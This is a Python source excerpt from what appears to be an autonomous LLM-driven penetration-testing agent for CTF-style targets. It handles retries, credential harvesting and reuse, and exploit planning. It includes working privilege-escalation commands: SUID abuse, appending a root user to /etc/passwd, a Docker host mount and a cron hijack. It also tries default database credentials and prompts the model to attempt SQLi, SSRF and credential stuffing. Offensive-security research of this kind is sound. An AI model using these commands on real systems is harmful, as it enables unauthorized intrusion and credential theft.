                    "method": _variant_method,
                })
                _any_success = _any_success or bool(
                    getattr(_variant_result, "success", False)
                )
                _last_result = _variant_result
                _variant_flags = self.flag_pattern.findall(_variant_stdout)
                if _variant_flags:
                    _v_ok, _v_reason = await self._verify_flag(
                        _variant_flags[0], _variant_stdout, _variant_args,
                        getattr(_variant_result, "elapsed_ms", 0),
                        tool_name=task_tool,
                    )
                    if _v_ok:
                        self._persist_verified_flag(
                            _variant_flags[0], _variant_url, "route-variant",
                        )
                        self.phase = OrchestratorPhase.DONE
                        execution.flag_result = TaskResult(
                            success=True, flag=_variant_flags[0],
                            steps=self.step_count,
                            tokens_used=self._tokens_used(),
                            time_elapsed=time.time() - self.start_time,
                        )
                        self._verified_flag_result = execution.flag_result
                        return execution
                    log.warning("route variant flag rejected: %s", _v_reason)
                if _condition:
                    _v_met, _v_detail = await self._verify_success_condition(
                        _condition, _executed_calls, _any_success,
                        bool(execution.flag_result),
                    )
                    if _v_met:
                        task_success = _any_success
                        task_params = _variant_args
                        task.action = {**(task.action or {}), "params": dict(_variant_args)}
                        self._task_log_event(
                            "info", "success_condition", task_id=task.id,
                            condition=_condition, met=True, detail=_v_detail,
                            phase="route-variant",
                        )
                        break
            task_result_text = self._summarize_task_result(
                tc_names, task_success, _all_task_stdouts
            )

        # ── Fix-and-retry: LLM analyzes failures, fixes param errors ──
        _fix_attempts = 0
        _task_tool = task_tool
        _fix_limit = 3 if _planned_write_intent(task_tool, task_params) else 2
        while not task_success and _fix_attempts < _fix_limit and _task_tool:
            fix = await self._analyze_and_fix_task(task, task_result_text)
            if not fix:
                break

            # Partial success: auth worked, store credentials (Fix A)
            if fix.get("partial_success"):
                creds = fix.get("credentials") or {}
                if creds.get("username"):
                    _cred_id = f"cred-partial-{int(time.time())}"
                    _cred_port = int(task_params.get("port", 0))
                    _cred_user = creds["username"]
                    _cred_pass = creds.get("password", "")
                    _cred_type = str(creds.get("cred_type", "mssql"))
                    self.dkg.add_node("Credential", _cred_id, {
                        "username": _cred_user,
                        "password": _cred_pass,
                        "host": self.target_host,
                        "port": _cred_port,
                        "source_host": self.target_host,
                        "cred_type": _cred_type,
                        "source": "partial_success",
                    })
                    # Also persist to CTEG for cross-task reuse
                    try:
                        self.cteg.add_credential(
                            host=self.target_host, port=_cred_port,
                            service_type=_cred_type,
                            username=_cred_user, password=_cred_pass,
                            source="partial_success",
                        )
                    except Exception as exc:
                        log.debug("swallowed exception: %s", exc, exc_info=True)
                    log.info("[PARTIAL SUCCESS] Stored credential '%s' (auth OK → CTEG)",
                             creds["username"])
                task_success = True
                task_result_text = (
                    f"[PARTIAL SUCCESS — {fix.get('reason', 'auth OK, command failed')}]"
                )
                break

            # Merge corrected params into existing ones — the LLM returns
            # only the fields that need correction, not the full parameter
            # set. Replacing would drop host/command/etc. Each corrected key
            # is checked against the tool's declared schema first: an
            # undeclared key must be visible instead of silently shipped (or
            # silently dropped deeper in the gateway).
            _corrected, _dropped_params = self._normalized_tool_args(
                _task_tool, fix.get("corrected_params", {}) or {},
            )
            if _dropped_params:
                log.warning(
                    "task=%s: ignoring corrected param(s) %s not declared by %s",
                    task.id, _dropped_params, _task_tool,
                )
            _merged_params = dict(task_params)
            _merged_params.update(_corrected)
            task_action = dict(task.action or {})
            task_action["params"] = _merged_params
            task.action = task_action
            task_params = _merged_params
            reason = fix.get("reason", "corrected params")
            print(f"  [FIX] {task.id}: {reason[:120]}")
            self.step_count += 1

            retry_result = await self.executor.execute(task)
            _last_result = retry_result
            retry_stdout = retry_result.stdout or ""
            retry_stderr = retry_result.stderr or ""

            if retry_result.success:
                _retry_condition_ok = True
                if _condition:
                    # The corrected params must still satisfy the task's
                    # success_condition (a repaired write is not done until
                    # its effect is observable).
                    _retry_condition_ok, _condition_detail = (
                        await self._verify_success_condition(
                            _condition,
                            [{
                                "name": _task_tool,
                                "args": dict(task_params),
                                "success": True,
                                "stdout": retry_stdout,
                                "stderr": retry_stderr,
                                "method": _call_method(_task_tool, task_params),
                            }],
                            True,
                            bool(execution.flag_result),
                        )
                    )
                    self._task_log_event(
                        "info", "success_condition",
                        task_id=task.id, condition=_condition,
                        met=bool(_retry_condition_ok), detail=_condition_detail,
                        phase="retry",
                    )
                task_success = _retry_condition_ok
                task_result_text = (
                    f"[FIXED — {reason[:100]}] "
                    f"{retry_stdout[:1200] or 'OK'}"
                )
                if not _retry_condition_ok:
                    task_result_text = (
                        f"[SUCCESS CONDITION NOT MET] {_condition_detail}\n"
                        f"{task_result_text}"
                    )
                # Check for flag
                flags = self.flag_pattern.findall(retry_stdout)
                if flags:
                    is_valid, reason_flag = await self._verify_flag(
                        flags[0], retry_stdout, task_params,
                        retry_result.elapsed_ms,
                        tool_name=_task_tool,
                    )
                    if is_valid:
                        self._persist_verified_flag(
                            flags[0], str(task_params.get("url", task_params.get("target_url", ""))),
                            "exploit-retry",
                        )
                        self.phase = OrchestratorPhase.DONE
                        execution.flag_result = TaskResult(
                            success=True, flag=flags[0],
                            steps=self.step_count,
                            tokens_used=self._tokens_used(),
                            time_elapsed=time.time() - self.start_time,
                        )
                        self._verified_flag_result = execution.flag_result
                        return execution
            else:
                task_result_text = (
                    f"Fix attempt {_fix_attempts + 1} failed "
                    f"[{reason[:80]}]: {retry_stderr or retry_stdout or 'no output'}"
                )
            _fix_attempts += 1

        # ── Auto-extract credentials from task output ────────────
        # When a task discovers working credentials (e.g. batch SSH
        # test via shell_exec), extract them into DKG Credential nodes
        # so subsequent tasks can use $credentials.* placeholders.
        if task_success and _raw_task_stdouts:
            await self._extract_credentials_from_task(
                task, _raw_task_stdouts
            )

        # ── P7: local-first replan (rule-based, before LLM plan review) ──
        if not task_success:
            _task_obj = task
            _core_res = CoreExecutionResult(
                task_id=task.id,
                tool=_task_tool,
                planned_tool=_task_tool,
                adherence=True,
                success=False,
                stdout=task_result_text[:4000],
                stderr="",
                exit_code=-1,
                elapsed_ms=0.0,
            )
            _eval2 = await self.evaluator.evaluate(_task_obj, _core_res)
            _repair = self.replanner.local_repair(_task_obj, _eval2)
            # O2.1: belief feedback — a failed task applies the Evaluator's
            # confidence delta (HYPOTHESIS_REJECTED lowers it, TOOL_ERROR /
            # INVALID_ARGUMENT leave it unchanged) to the matching hypothesis.
            try:
                self._apply_vulnerability_feedback(
                    task, success=False,
                    failure_type=(
                        _eval2.failure_type.value
                        if _eval2.failure_type is not None
                        else None
                    ),
                    delta=float(_eval2.confidence_delta or 0.0),
                )
                self._apply_attack_path_feedback(
                    task, success=False,
                    failure_type=(
                        _eval2.failure_type.value
                        if _eval2.failure_type is not None else None
                    ),
                )
            except Exception as exc:
                log.debug("swallowed exception: %s", exc, exc_info=True)
            self._task_log_event(
                "info", "replan_requested",
                task_id=task.id,
                action=_repair.action,
                failure_type=(
                    _eval2.failure_type.value if _eval2.failure_type else None
                ),
                reason=_repair.reason,
                rejected_duplicate=_repair.rejected_duplicate,
            )
            if _repair.action == "replace" and _repair.replacement is not None:
                _rep_task = _repair.replacement
                _rep_task.source = "replanner"
                _plan_tasks = (
                    self.exploitation_plan.tasks
                    if self.exploitation_plan
                    else []
                )
                if not self._is_duplicate_task(_rep_task, _plan_tasks):
                    _plan_tasks.append(_rep_task)
                    print(
                        f"[REPLAN] {task.id} → "
                        f"{_repair.replacement.id} ({_repair.reason})"
                    )
            elif _repair.action == "invalidate":
                _failed_id = task.id
                for _t in (
                    self.exploitation_plan.tasks
                    if self.exploitation_plan
                    else []
                ):
                    if _failed_id in dependency_task_ids(_t):
                        _t.status = TaskStatus.ABANDONED
                        _t.result_summary = (
                            f"invalidated: dependent task {_failed_id} failed (P7)"
                        )

        execution.success = task_success
        execution.result_text = task_result_text
        if _last_result is not None:
            execution.stderr = getattr(_last_result, "stderr", "") or ""
            execution.exit_code = getattr(_last_result, "exit_code", 0) or 0
            execution.elapsed_ms = getattr(_last_result, "elapsed_ms", 0.0) or 0.0
            execution.normalized = dict(
                getattr(_last_result, "normalized", None)
                or getattr(_last_result, "parsed_output", None)
                or {}
            )
        return execution

    async def _run_with_runtime(
        self, target_url: str, cteg_hints: dict | None = None
    ) -> TaskResult | None:
        """Runtime-driven main loop (v2, sole execution path).

        Outer loop control (plan -> schedule -> execute -> evaluate ->
        replan -> terminate) is delegated to ``core.Runtime``; the per-task
        execution + post-processing stays here as the injected Executor.
        Scheduler ordering and plan-exhaustion review replicate the legacy
        loop (ParityScheduler + stall review).
        """
        self._plan_review_exhausted = False
        # Plan-review cadence restarts with each runtime cycle: a review must
        # be justified by executions, and a repeated empty stall review is not.
        self._executions_since_review = 0
        self._stall_review_since_execution = False
        self._review_done_this_cycle = False
        self._verified_flag_result = None
        if not self._solo_cycle_context_injected:
            self.llm.replace_system_prompt(SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED)
            self._solo_cycle_context_injected = True
        else:
            self._maybe_compress()
        if not hasattr(self, "_exploit_chain"):
            self._exploit_chain = []

        if not self.exploitation_plan or not self.exploitation_plan.tasks:
            self.exploitation_plan = await self._generate_exploitation_plan(
                target_url, cteg_hints
            )

        # Inject the same initial world context the unified loop used, so
        # LLM-driven execution sees services/endpoints/session state even
        # though plan generation runs as a separate call.
        try:
            state = self._get_state()
            services_text = "\n".join(
                f"- port {s.port}/{s.protocol}: {s.version or s.banner}"
                for s in state.services[:10] if s.port
            )
            endpoints_text = "\n".join(
                f"- {ep.url} [{ep.method}]"
                + (f" params={', '.join(ep.params)}" if ep.params else "")
                for ep in state.endpoints[:12]
            )
            session_cookies = ""
            if self.client._session and self.client._session.cookie_jar:
                jar_cookies = list(self.client._session.cookie_jar)
                if jar_cookies:
                    cookie_str = "; ".join(
                        f"{ck.key}={ck.value}" for ck in jar_cookies
                    )
                    session_cookies = (
                        f"\n## ACTIVE SESSION — YOU ARE LOGGED IN\n"
                        f"Session cookie: {cookie_str[:200]}\n"
                        f"Use the 'cookie' parameter on EVERY curl_get and "
                        f"http_post call:\n"
                        f'  curl_get(url="http://localhost:8000/admin", '
                        f'cookie="{cookie_str[:150]}")\n'
                        f"FIRST: try /admin, /dashboard, /profile, /config "
                        f"with the cookie.\n"
                        f"THEN: try IDOR — same cookie, different IDs in "
                        f"URL paths.\n"
                    )
            belief_block = self._belief_context(compact=True)
            if belief_block:
                belief_block = f"\n{belief_block}\n"
            plan_status = self._format_plan_status() if self.exploitation_plan else ""
            self.llm.add_context_message(
                f"Target: {target_url}\n\n"
                f"## Discovered Services\n{services_text}\n\n"
                f"## Discovered Endpoints\n{endpoints_text}\n"
                f"{session_cookies}\n"
                f"{plan_status}\n"
                f"{belief_block}",
                role="user",
            )
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)

        tool_defs = [
            d for d in self.attack_gateway.get_tool_definitions()
            if d.get("function", {}).get("name") not in self._BLACKLISTED_TOOLS
        ]
        tool_defs += [
            d for d in self.recon_gateway.get_tool_definitions()
            if d.get("function", {}).get("name") not in self._BLACKLISTED_TOOLS
        ]
        try:
            mcp_defs = self.mcp_pool.get_tool_definitions()
            if mcp_defs:
                tool_defs += mcp_defs
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)

        # Response-derived filter probing runs first: it is bounded, GET-only,
        # and cheaper than any plan task, and it is the only path that reaches
        # data an endpoint discloses solely through a filtered view.
        filter_result = await self._probe_json_filter_parameters()
        if filter_result and filter_result.success:
            return filter_result

        # A forced reconsideration round also lets the deferred evidence-free
        # guesses through the deterministic pass — once, bounded, and only when
        # the grounded plan produced no new progress.
        _extra_vulns: list[dict] | None = None
        if getattr(self, "_force_plan_reconsider", False):
            self._force_plan_reconsider = False
            _extra_vulns = list(getattr(self, "speculative_hypotheses", []) or [])
            if _extra_vulns:
                log.info(
                    "[systematic] forced reconsideration: probing %d deferred "
                    "evidence-free guess(es)", len(_extra_vulns),
                )
        systematic_result = await self._systematic_exploit_pass(
            target_url, extra_vulns=_extra_vulns
        )
        if systematic_result and systematic_result.success:
            return systematic_result

        self._runtime_flag_result = None
        self._runtime_skip_task = False
        runtime = Runtime(
            planner=_RuntimePlannerAdapter(self, target_url, cteg_hints),
            scheduler=ParityScheduler(self._exhausted_task_ids),
            executor=_RuntimeExecutorAdapter(self, tool_defs),
            evaluator=_RuntimeEvaluatorAdapter(self),
            memory=self.memory,
            state_provider=self._get_state,
        )
        try:
            outcome = await runtime.run(
                self._get_state(),
                Objective(
                    task_description=target_url,
                    budgets=Budget(
                        time_budget_seconds=max(1, int(self._remaining_budget())),
                        token_budget=self.token_budget,
                        max_loops=25,
                    ),
                ),
                Budget(
                    time_budget_seconds=max(1, int(self._remaining_budget())),
                    token_budget=self.token_budget,
                    max_loops=25,
                ),
            )
        except _RuntimeFlagFound:
            return self._runtime_flag_result
        log.info(
            "Runtime loop finished: %d iterations, %d replans (%s)",
            outcome.iterations, outcome.replan_count, outcome.stopped_reason,
        )
        if self._runtime_flag_result is not None:
            return self._runtime_flag_result
        if self._verified_flag_result is not None:
            return self._verified_flag_result
        self._generate_phase_summary("exploit")
        return None

    def _build_plan_exhaustion_context(self) -> str:
        """Build the plan-exhausted review summary (legacy loop parity).

        Reproduces the thin-plan warning and [RECONSIDER] context the
        unified loop injected when no ready task remained, so the
        Runtime-driven path asks the same question at stall time.
        """
        state = self._get_state()
        plan = self.exploitation_plan
        n_tasks = len(plan.tasks) if plan else 0
        n_endpoints = len(state.endpoints)
        n_services = len(state.services)
        n_done = sum(
            1 for t in (plan.tasks or [])
            if t.status is TaskStatus.SUCCESS
        )
        ep_list = [f"{ep.method} {ep.url}" for ep in state.endpoints[-10:]]
        svc_list = [f"{s.port}/{s.protocol} {s.version or s.banner}"
                    for s in state.services[-5:] if s.port]

        # Thin-plan detection: too few tasks given the attack surface.
        thin_warning = ""
        if n_tasks <= 3 and n_done <= 4 and (n_endpoints >= 3 or n_services >= 1):
            thin_warning = (
                f"\nWARNING: Only {n_tasks} tasks ({n_done} done) for "
                f"{n_endpoints} endpoints + {n_services} services. "
                f"The plan was too thin. "
                f"\nSTEP 1 — ENUMERATE: You have dirb_scan and gobuster_dir — "
                f"USE THEM on every HTTP endpoint to discover hidden paths. "
                f"Also curl_get common paths: /api, /admin, /login, /config, "
                f"/.env, /backup, /robots.txt, /.git/HEAD, plus any "
                f"framework-specific paths for the detected technology stack. "
                f"A simple index page often hides complex apps behind other paths."
                f"\nSTEP 2 — EXPLOIT: After enumeration, based on what you "
                f"DISCOVERED, add exploitation tasks. Look at EVERY endpoint: "
                f"could it be vulnerable to SQLi, LFI, command injection, SSTI, "
                f"auth bypass, XXE, SSRF, file upload, or credential stuffing? "
                f"Aim for 8-15 tasks covering multiple attack vectors.\n"
                f"IMPORTANT: Prioritize the ORIGINAL vulnerability type "
                f"detected during analysis. If the primary vulnerability "
                f"has not been fully exploited, try MANY variations "
                f"(different credentials, parameters, payloads) before "
                f"moving on to unrelated endpoints. Exhaust the primary "
                f"target first — don't abandon it for newly discovered ports.\n"
            )
        return (
            f"Plan exhausted. {n_tasks} tasks ({n_done} completed).\n"
            + (f"Known endpoints ({n_endpoints}): {', '.join(ep_list)}"
               if ep_list else "No endpoints discovered.")
            + (f"\nKnown services ({n_services}): {', '.join(svc_list)}"
               if svc_list else "")
            + (f"\nCredentials: {len(state.credentials)} known"
               if state.credentials else "")
            + thin_warning
            + "\n[RECONSIDER] No flag found after exhausting the plan. "
            "The evidence you've relied on may be incomplete or "
            "misleading. What ELSE could this application be? "
            "Also review the tools you used — some support multiple "
            "services or operations beyond what you tried. If you "
            "only used a subset of a tool's capabilities, explore "
            "its other functions; the attack surface may be broader "
            "than what the initial evidence suggested."
        )

    # DEPRECATED: not currently wired into the main run() loop.
    # Kept for potential future use in automated vuln-to-tool mapping.
    async def _execute_privesc(self, target_url: str) -> str | None:
        """Execute privilege escalation exploitation based on linux_priv_check results.

        Parses the output of linux_priv_check to detect specific privesc vectors
        (SUID binaries, writable /etc/passwd, Docker socket, capabilities, cron
        hijack, LD_PRELOAD) and executes the appropriate exploitation command.

        Returns a flag string if found, None otherwise.
        """
        # Run linux_priv_check to get detection results
        priv_result = await self._call_tool("linux_priv_check", {})
        if not priv_result or not getattr(priv_result, 'success', False):
            return None

        output = getattr(priv_result, 'stdout', '') or ''
        log.info("[privesc] Analyzing linux_priv_check output (%d bytes)", len(output))

        # Parse output sections and extract vectors
        vectors: dict[str, list[str]] = {
            "suid": [],
            "writable_passwd": False,
            "docker_socket": False,
            "capabilities": [],
            "cron_writable": [],
            "ld_preload": False,
        }

        # Detect SUID binaries
        suid_section = False
        for line in output.split("\n"):
            line = line.strip()
            if "=== SUID ===" in line:
                suid_section = True
                continue
            if line.startswith("==="):
                suid_section = False
                continue
            if suid_section and line:
                if "/find" in line:
                    vectors["suid"].append("find")
                elif "/vim" in line or "/vi" in line:
                    vectors["suid"].append("vim")
                elif "/bash" in line:
                    vectors["suid"].append("bash")
                elif "/python" in line or "/python3" in line:
                    vectors["suid"].append("python")
                elif "/nmap" in line:
                    vectors["suid"].append("nmap")
                elif "/perl" in line:
                    vectors["suid"].append("perl")

            # Detect writable /etc/passwd
            if "/etc/passwd" in line and "rw" in line:
                vectors["writable_passwd"] = True

            # Detect Docker socket
            if "/var/run/docker.sock" in line:
                vectors["docker_socket"] = True

            # Detect capabilities
            if "cap_sys_admin" in line.lower() or "cap_dac_read_search" in line.lower():
                vectors["capabilities"].append(line)

            # Detect writable cron jobs
            if "cron" in line.lower() and ("w" in line or "write" in line.lower()):
                # Extract the path
                parts = line.split()
                for p in parts:
                    if p.startswith("/") and "cron" in p:
                        vectors["cron_writable"].append(p)

            # Detect LD_PRELOAD in sudo
            if "LD_PRELOAD" in line:
                vectors["ld_preload"] = True

        log.info("[privesc] Detected vectors: SUID=%s, passwd=%s, docker=%s, caps=%d, cron=%d, ld_preload=%s",
                 vectors["suid"], vectors["writable_passwd"], vectors["docker_socket"],
                 len(vectors["capabilities"]), len(vectors["cron_writable"]), vectors["ld_preload"])

        # Execute exploitation commands based on detected vectors
        exploit_cmds: list[str] = []

        # SUID exploitation
        for suid_bin in vectors["suid"]:
            if suid_bin == "find":
                exploit_cmds.append("find / -name 'flag*' -exec cat {} \\; 2>/dev/null")
                exploit_cmds.append("find / -name '*.txt' -path '*/root/*' -exec cat {} \\; 2>/dev/null")
            elif suid_bin == "vim":
                exploit_cmds.append("vim -c ':py3 import os; os.system(\"cat /root/flag* /home/*/flag*\")' -c ':q!' /dev/null 2>/dev/null")
            elif suid_bin == "bash":
                exploit_cmds.append("bash -p -c 'cat /root/flag*' 2>/dev/null")
            elif suid_bin == "python":
                exploit_cmds.append("python3 -c 'import os; os.system(\"cat /root/flag* /home/*/flag*\")' 2>/dev/null")
            elif suid_bin == "nmap":
                exploit_cmds.append("nmap --script='os.execute(\"cat /root/flag*\")' 2>/dev/null")
            elif suid_bin == "perl":
                exploit_cmds.append("perl -e 'exec \"cat /root/flag*\";' 2>/dev/null")

        # Writable /etc/passwd
        if vectors["writable_passwd"]:
            exploit_cmds.append("echo 'privesc::0:0:root:/root:/bin/bash' >> /etc/passwd && su privesc -c 'cat /root/flag*'")

        # Docker socket
        if vectors["docker_socket"]:
            exploit_cmds.append("docker run --rm -v /:/host alpine:latest cat /host/root/flag* 2>/dev/null")

        # Cron hijack
        if vectors["cron_writable"]:
            for cron_path in vectors["cron_writable"][:2]:
                exploit_cmds.append(f"echo '#!/bin/bash\ncat /root/flag* > /tmp/out.txt' > {cron_path} && chmod +x {cron_path} && sleep 60 && cat /tmp/out.txt")

        # Capabilities
        if vectors["capabilities"]:
            exploit_cmds.append("getcap -r / 2>/dev/null | grep cap_dac_read_search | while read f; do echo \"=== $f ===\"; cat \"${f%% *}\" 2>/dev/null; done")

        if not exploit_cmds:
            log.info("[privesc] No exploitable vectors detected")
            return None

        # Execute each exploit command
        for cmd in exploit_cmds[:8]:  # Safety cap
            log.info("[privesc] Executing: %s", cmd[:100])
            result = await self._call_tool(
                "shell_exec", {"command": cmd}
            )
            if result and getattr(result, 'success', False):
                stdout = getattr(result, 'stdout', '') or ''
                flags = self.flag_pattern.findall(stdout)
                if flags:
                    is_valid, reason = await self._verify_flag(
                        flags[0], stdout, {"command": cmd},
                        getattr(result, "elapsed_ms", 0), tool_name="shell_exec",
                    )
                    if is_valid:
                        log.info("[privesc] Flag found via SUID/capability exploit: %s", flags[0])
                        return flags[0]

        return None

    async def _try_db_default_credentials(self, host: str, discovered_ports: list) -> None:
        """Try default credentials against discovered database services.

        Uses well-known default credential pairs for each DB type.  Results
        are written to DKG Credential nodes with source 'default_trial'.
        """
        _DB_DEFAULTS: dict[str, list[tuple[str, str]]] = {
            "mysql":      [("root", ""), ("root", "root"), ("root", "password")],
            "postgresql": [("postgres", "postgres"), ("postgres", ""), ("postgres", "password")],
            "redis":      [("", "")],
            "mssql":      [("sa", ""), ("sa", "sa"), ("sa", "Password123")],
            "oracle":     [("system", "oracle"), ("sys", "oracle")],
            "mongodb":    [("admin", "admin"), ("admin", ""), ("root", "root")],
        }
        _DB_PORT_PROTO = {3306: "mysql", 5432: "postgresql", 6379: "redis",
                         1433: "mssql", 1521: "oracle", 27017: "mongodb"}
        for p in discovered_ports:
            port = p.get("port", 0)
            proto = _DB_PORT_PROTO.get(port)
            if not proto or proto not in _DB_DEFAULTS:
                continue
            tool_map = {
                "mysql": "mysql_query", "postgresql": "psql_query",
                "redis": "redis_cmd", "mssql": "mssqlclient_query",
                "oracle": "oracle_query", "mongodb": "shell_exec",
            }
            tool = tool_map.get(proto)
            if not tool:
                continue
            for username, password in _DB_DEFAULTS[proto][:3]:
                try:
                    if proto == "mongodb":
                        r = await self._call_tool(
                            tool, {"command": f"echo 'db.runCommand({{ping:1}})' | mongosh mongodb://{username}:{password}@{host}:{port} --quiet 2>&1"}
                        )
                    elif proto == "redis":
                        r = await self._call_tool(
                            tool, {"command": "PING", "host": host, "port": port}
                        )
                    else:
                        r = await self._call_tool(
                            tool, {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}
                        )
                    if r and getattr(r, 'success', False):
                        stdout = (getattr(r, 'stdout', '') or '').lower()
                        if any(kw in stdout for kw in ("ok", "1 row", "pong", "connected")):
                            log.info("[db_creds] Default creds WORK: %s:%s@%s:%d", username, password, host, port)
                            self.dkg.add_node("Credential", f"cred-default-{proto}-{host}-{port}", {
                                "username": username, "password": password,
                                "source_host": host, "cred_type": proto,
                                "port": port, "source": "default_trial", "confirmed": True,
                            })
                            break
                except Exception:
                    continue

    # Bounded budget for response-derived filter probing.
    _MAX_FILTER_ENDPOINTS = 6
    _MAX_FILTER_PROBES = 12

    async def _probe_json_filter_parameters(self) -> TaskResult | None:
        """Try the filters a JSON endpoint's own records imply.

        A collection endpoint usually accepts a filter named after a field of
        the records it returns.  Reading those names off the response (and
        drawing values from the endpoints already discovered) turns a plain
        listing request into a filtered one — a different slice of the data,
        which is where an impact proof can show up.  GET only, bounded.
        """
        from urllib.parse import quote, urlparse

        endpoints = [
            str(e.get("url", "")) for e in self.dkg.query_nodes("Endpoint")
            if str(e.get("url", "")).startswith("http")
        ]
        if not endpoints:
            return None
        known_paths: list[str] = []
        for url in endpoints:
            path = urlparse(url).path
            if path and path != "/" and path not in known_paths:
                known_paths.append(path)

        probes = 0
        for url in endpoints[: self._MAX_FILTER_ENDPOINTS]:
            if probes >= self._MAX_FILTER_PROBES:
                break
            try:
                listing = await self._call_tool(
                    "curl_get", {"url": url, "timeout": 10}
                )
            except Exception:
                continue
            payload = _json_body(getattr(listing, "stdout", "") or "")
            candidates = _derive_filter_candidates(payload, known_paths)
            if not candidates:
                continue
            log.info(
                "[filter-probe] %s: %d derived filter candidate(s)",
                url, len(candidates),
            )
            for param, value in candidates:
                if probes >= self._MAX_FILTER_PROBES:
                    break
                probes += 1
                separator = "&" if "?" in url else "?"
                probe_url = f"{url}{separator}{quote(param)}={quote(str(value))}"
                try:
                    result = await self._call_tool(
                        "curl_get", {"url": probe_url, "timeout": 10}
                    )
                except Exception:
                    continue
                stdout = getattr(result, "stdout", "") or ""
                flags = self.flag_pattern.findall(stdout)
                if not flags:
                    continue
                is_valid, reason = await self._verify_flag(
                    flags[0], stdout,
                    {"url": probe_url, "tool": "curl_get"}, 0, "curl_get",
                )
                if not is_valid:
                    log.warning("[filter-probe] flag candidate rejected: %s", reason)
                    continue
                self._persist_verified_flag(flags[0], probe_url, "filter-probe")
                log.info("[filter-probe] FLAG FOUND %s via %s", flags[0], probe_url)
                self.phase = OrchestratorPhase.DONE
                return TaskResult(
                    success=True, flag=flags[0], steps=self.step_count,
                    tokens_used=self._tokens_used(),
                    time_elapsed=time.time() - self.start_time,
                )
        return None

    async def _systematic_exploit_pass(
        self, target_url: str, extra_vulns: list[dict] | None = None,
    ) -> TaskResult | None:
        """Systematic exploit: iterate DKG Vulnerability nodes and run mapped tools.

        Runs BEFORE the LLM-driven loop in Solo mode. This catches
        straightforward vulnerabilities without any LLM cost — for each
        known Vulnerability node, we run the appropriate tool automatically.

        ``extra_vulns`` carries the deferred evidence-free guesses, which are
        only probed during a forced reconsideration round (bounded by MAX_TESTS
        and the same dedup cache as everything else).

        Returns TaskResult if a flag is found, None otherwise.
        """
        state = self._get_state()
        vulns = self.dkg.query_nodes("Vulnerability")  # raw for toolkit fields
        if extra_vulns:
            vulns = list(vulns) + [v for v in extra_vulns if isinstance(v, dict)]
        if not vulns:
            print("[systematic] No Vulnerability nodes in DKG — skipping")
            return None

        # Vuln type → tool mapping (with fuzzy matching)
        # Fuzzy match: if a vuln type CONTAINS one of these substrings, it maps
        VULN_TOOL_MAP = _VULN_TOOL_MAP
        FUZZY_MAP = _VULN_FUZZY_MAP

        def _resolve_tools(vt: str) -> list[str]:
            """Resolve tools for a vuln type — exact match first, then fuzzy."""
            vt_lower = vt.lower().strip()
            tools = VULN_TOOL_MAP.get(vt_lower, [])
            if tools:
                return tools
            # Fuzzy: check if any keyword is contained in vt
            for keyword, tlist in FUZZY_MAP.items():
                if keyword in vt_lower:
                    return tlist
            # Unknown/unmapped vuln types: provide generic HTTP exploitation
            # tools as a fallback so the systematic pass doesn't skip them.
            # These tools cover form-based API exploits, auth bypass, and
            # parameter injection — the most common HTTP-based attack vectors.
            return list(_FALLBACK_HTTP_TOOLS)

        def _detect_proto_from_service(endpoint: str, dkg: DKG) -> set[str] | None:
            """Detect protocol tool set from DKG Service node by port.

            When an endpoint has no URI scheme (e.g. 'localhost:10119'),
            look up the Service node by port to determine which protocol-
            specific tools are appropriate. Returns a _PROTO_TOOLS set or None.
            """
            import re
            m = re.search(r':(\d+)$', endpoint)
            if not m:
                return None
            port = m.group(1)
            for svc in dkg.query_nodes("Service"):
                if str(svc.get("port")) == port:
                    svc_name = (svc.get("service_name") or svc.get("protocol") or "").lower()
                    # Service name detection
                    if "mssql" in svc_name or "sql server" in svc_name:
                        return {"mssql_query", "mssqlclient_query", "shell_exec"}
                    if "mysql" in svc_name or "mariadb" in svc_name:
                        return {"mysql_query", "shell_exec"}
                    if "postgres" in svc_name:
                        return {"psql_query", "shell_exec"}
                    if "redis" in svc_name:
                        return {"redis_cmd", "shell_exec"}
                    if "ssh" in svc_name:
                        return {"ssh_exec", "ssh_key_exec", "test_credential"}
                    if "oracle" in svc_name:
                        return {"oracle_query", "shell_exec"}
                    if "mongodb" in svc_name:
                        return {"shell_exec"}
                    if "memcached" in svc_name:
                        return {"shell_exec"}
                    # K8s / cloud services — recognized with dedicated tools.
                    # Service names come from nmap fingerprints, openssl CN
                    # probes, or API fingerprint matching.
                    # IMPORTANT: check more-specific names BEFORE broader ones
                    # (kubernetes-admission before kubernetes).
                    if "etcd" in svc_name:
                        return {"etcdctl_get", "k8s_etcd_keys", "shell_exec"}
                    if "tiller" in svc_name:
                        # Helm v2 Tiller service — gRPC API on port 44134
                        return {"helm", "shell_exec"}
                    if "kubernetes-admission" in svc_name:
                        # Admission webhook: HTTP endpoint accepting AdmissionReview
                        # JSON. Uses send_payload/curl_get, not kubectl tools.
                        return {"send_payload", "curl_get", "shell_exec"}
                    if "kubernetes" in svc_name or "kubelet" in svc_name:
                        return {"kubectl_auth_check", "kubelet_probe", "k8s_kubelet_exec", "shell_exec"}
                    # Active Directory / Windows services — recognizable but no
                    # generic protocol tools in the current VULN_TOOL_MAP.
                    # Return empty set so systematic pass skips these vulns
                    # (AD exploitation is handled by ADAgent, not systematic pass).
                    if any(kw in svc_name for kw in ("kerberos", "ldap", "smb", "msrpc",
                                                       "netbios", "kpasswd", "ad-")):
                        return set()
                    # Port-based fallback
                    _PORT_PROTO: dict[str, set[str]] = {
                        "1433": {"mssql_query", "mssqlclient_query", "shell_exec"},
                        "3306": {"mysql_query", "shell_exec"},
                        "5432": {"psql_query", "shell_exec"},
                        "6379": {"redis_cmd", "shell_exec"},
                        "22": {"ssh_exec", "ssh_key_exec", "test_credential"},
                        "1521": {"oracle_query", "shell_exec"},
                        "27017": {"shell_exec"},
                        "11211": {"shell_exec"},
                        "44134": {"helm", "shell_exec"},  # Helm v2 Tiller
                        # AD ports — recognized but no generic tools
                        "88": set(), "389": set(), "636": set(), "445": set(),
                        "139": set(), "135": set(), "3268": set(), "3269": set(),
                    }
                    if port in _PORT_PROTO:
                        return _PORT_PROTO[port]
            return None

        session_cookies = ""
        if self.client._session and self.client._session.cookie_jar:
            jar = list(self.client._session.cookie_jar)
            if jar:
                session_cookies = "; ".join(f"{c.key}={c.value}" for c in jar)

        # Sort vulns: LLM-suggested tools first (they have correct args),
        # then other mapped vulns, then unmapped. This prevents vulns
        # without tool_args from poisoning the dedup cache before vulns
        # that DO have LLM-provided args get a chance to run.
        llm_vulns = [v for v in vulns if v.get("suggested_tool")]
        other_mapped = [v for v in vulns if v not in llm_vulns
